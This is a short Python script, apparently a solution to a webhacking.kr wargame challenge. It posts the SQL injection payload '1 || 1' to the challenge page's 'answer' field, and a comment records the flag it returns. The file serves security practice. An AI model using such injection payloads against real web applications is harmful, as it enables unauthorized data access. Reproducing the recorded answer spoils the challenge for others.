from Solution.webhacking.basic import login

s = login()


def try_payload(payload):
    r = s.post('http://webhacking.kr/challenge/web/web-03/index.php', data={
        'answer': payload,
        'id': '1'
    })
    print(r.text)


try_payload('1 || 1')  # => get the answer = new_sql_injection
# try_payload('1 && 0')
